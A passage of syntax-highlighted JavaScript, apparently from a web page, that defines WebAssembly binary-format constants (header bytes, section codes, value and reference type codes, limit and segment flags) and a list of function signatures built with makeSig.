      <span class="token punctuation">&#125;</span>
      <span class="token comment">// Header declaration constants</span>
      <span class="token keyword">var</span> kWasmH0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kWasmH1 <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kWasmH2 <span class="token operator">=</span> <span class="token number">0x73</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kWasmH3 <span class="token operator">=</span> <span class="token number">0x6d</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kWasmV0 <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kWasmV1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kWasmV2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kWasmV3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kHeaderSize <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kPageSize <span class="token operator">=</span> <span class="token number">65536</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kSpecMaxPages <span class="token operator">=</span> <span class="token number">65536</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kMaxVarInt32Size <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> kMaxVarInt64Size <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kDeclNoLocals <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token comment">// Section declaration constants</span>
      <span class="token keyword">let</span> kUnknownSectionCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTypeSectionCode <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// Function signature declarations</span>
      <span class="token keyword">let</span> kImportSectionCode <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// Import declarations</span>
      <span class="token keyword">let</span> kFunctionSectionCode <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">// Function declarations</span>
      <span class="token keyword">let</span> kTableSectionCode <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment">// Indirect function table and other tables</span>
      <span class="token keyword">let</span> kMemorySectionCode <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// Memory attributes</span>
      <span class="token keyword">let</span> kGlobalSectionCode <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token comment">// Global declarations</span>
      <span class="token keyword">let</span> kExportSectionCode <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token comment">// Exports</span>
      <span class="token keyword">let</span> kStartSectionCode <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token comment">// Start function declaration</span>
      <span class="token keyword">let</span> kElementSectionCode <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token comment">// Elements section</span>
      <span class="token keyword">let</span> kCodeSectionCode <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// Function code</span>
      <span class="token keyword">let</span> kDataSectionCode <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token comment">// Data segments</span>
      <span class="token keyword">let</span> kDataCountSectionCode <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token comment">// Data segment count (between Element &amp; Code)</span>
      <span class="token keyword">let</span> kTagSectionCode <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token comment">// Tag section (between Memory &amp; Global)</span>
      <span class="token keyword">let</span> kStringRefSectionCode <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span> <span class="token comment">// Stringref literals section (between Tag &amp; Global)</span>
      <span class="token keyword">let</span> kLastKnownSectionCode <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span>
      <span class="token comment">// Name section types</span>
      <span class="token keyword">let</span> kModuleNameCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kFunctionNamesCode <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kLocalNamesCode <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmFunctionTypeForm <span class="token operator">=</span> <span class="token number">0x60</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmStructTypeForm <span class="token operator">=</span> <span class="token number">0x5f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmArrayTypeForm <span class="token operator">=</span> <span class="token number">0x5e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmSubtypeForm <span class="token operator">=</span> <span class="token number">0x50</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmSubtypeFinalForm <span class="token operator">=</span> <span class="token number">0x4f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmRecursiveTypeGroupForm <span class="token operator">=</span> <span class="token number">0x4e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kNoSuperType <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kLimitsNoMaximum <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kLimitsWithMaximum <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kLimitsSharedNoMaximum <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kLimitsSharedWithMaximum <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kLimitsMemory64NoMaximum <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kLimitsMemory64WithMaximum <span class="token operator">=</span> <span class="token number">0x05</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kLimitsMemory64SharedNoMaximum <span class="token operator">=</span> <span class="token number">0x06</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kLimitsMemory64SharedWithMaximum <span class="token operator">=</span> <span class="token number">0x07</span><span class="token punctuation">;</span>
      <span class="token comment">// Segment flags</span>
      <span class="token keyword">let</span> kActiveNoIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kPassive <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kActiveWithIndex <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kDeclarative <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kPassiveWithElements <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kDeclarativeWithElements <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
      <span class="token comment">// Function declaration flags</span>
      <span class="token keyword">let</span> kDeclFunctionName <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kDeclFunctionImport <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kDeclFunctionLocals <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kDeclFunctionExport <span class="token operator">=</span> <span class="token number">0x08</span><span class="token punctuation">;</span>
      <span class="token comment">// Value types and related</span>
      <span class="token keyword">let</span> kWasmVoid <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmI32 <span class="token operator">=</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmI64 <span class="token operator">=</span> <span class="token number">0x7e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmF32 <span class="token operator">=</span> <span class="token number">0x7d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmF64 <span class="token operator">=</span> <span class="token number">0x7c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmS128 <span class="token operator">=</span> <span class="token number">0x7b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmI8 <span class="token operator">=</span> <span class="token number">0x78</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmI16 <span class="token operator">=</span> <span class="token number">0x77</span><span class="token punctuation">;</span>
      <span class="token comment">// These are defined as negative integers to distinguish them from positive type</span>
      <span class="token comment">// indices.</span>
      <span class="token keyword">let</span> kWasmNullFuncRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x0d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmNullExternRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x0e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmNullRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x0f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmFuncRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmAnyFunc <span class="token operator">=</span> kWasmFuncRef<span class="token punctuation">;</span> <span class="token comment">// Alias named as in the JS API spec</span>
      <span class="token keyword">let</span> kWasmExternRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x11</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmAnyRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x12</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmEqRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x13</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmI31Ref <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x14</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmStructRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x15</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmArrayRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x16</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmExnRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x17</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmStringRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x19</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmStringViewWtf8 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x1a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmStringViewWtf16 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x1e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmStringViewIter <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x1f</span><span class="token punctuation">;</span>
      <span class="token comment">// Use the positive-byte versions inside function bodies.</span>
      <span class="token keyword">let</span> kLeb128Mask <span class="token operator">=</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kFuncRefCode <span class="token operator">=</span> kWasmFuncRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kAnyFuncCode <span class="token operator">=</span> kFuncRefCode<span class="token punctuation">;</span> <span class="token comment">// Alias named as in the JS API spec</span>
      <span class="token keyword">let</span> kExternRefCode <span class="token operator">=</span> kWasmExternRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kAnyRefCode <span class="token operator">=</span> kWasmAnyRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kEqRefCode <span class="token operator">=</span> kWasmEqRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kI31RefCode <span class="token operator">=</span> kWasmI31Ref <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kNullExternRefCode <span class="token operator">=</span> kWasmNullExternRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kNullFuncRefCode <span class="token operator">=</span> kWasmNullFuncRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kStructRefCode <span class="token operator">=</span> kWasmStructRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kArrayRefCode <span class="token operator">=</span> kWasmArrayRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExnRefCode <span class="token operator">=</span> kWasmExnRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kNullRefCode <span class="token operator">=</span> kWasmNullRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kStringRefCode <span class="token operator">=</span> kWasmStringRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kStringViewWtf8Code <span class="token operator">=</span> kWasmStringViewWtf8 <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kStringViewWtf16Code <span class="token operator">=</span> kWasmStringViewWtf16 <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kStringViewIterCode <span class="token operator">=</span> kWasmStringViewIter <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmRefNull <span class="token operator">=</span> <span class="token number">0x63</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kWasmRef <span class="token operator">=</span> <span class="token number">0x64</span><span class="token punctuation">;</span>
      <span class="token keyword">function</span> <span class="token function">wasmRefNullType</span><span class="token punctuation">(</span><span class="token parameter">heap_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">opcode</span><span class="token operator">:</span> kWasmRefNull<span class="token punctuation">,</span> <span class="token literal-property property">heap_type</span><span class="token operator">:</span> heap_type <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">wasmRefType</span><span class="token punctuation">(</span><span class="token parameter">heap_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">opcode</span><span class="token operator">:</span> kWasmRef<span class="token punctuation">,</span> <span class="token literal-property property">heap_type</span><span class="token operator">:</span> heap_type <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">let</span> kExternalFunction <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExternalTable <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExternalMemory <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExternalGlobal <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExternalTag <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTableZero <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kMemoryZero <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSegmentZero <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExceptionAttribute <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token comment">// Useful signatures</span>
      <span class="token keyword">let</span> kSig_i_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_l_l <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_i_l <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_i_ii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_i_iii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_iiii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_l_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_f_ff <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF32<span class="token punctuation">,</span> kWasmF32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_d_dd <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">,</span> kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_l_ll <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">,</span> kWasmI64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_i_dd <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">,</span> kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_i_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_l_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_f_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_d_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_ii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_iii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_l <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_li <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_lii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_d <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_dd <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">,</span> kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_ddi <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">,</span> kWasmF64<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_ii_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_iii_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_ii_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_iii_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_ii_ii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_iii_ii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span>
        <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_f <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_f_f <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_f_d <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_d_d <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_r_r <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_a_a <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
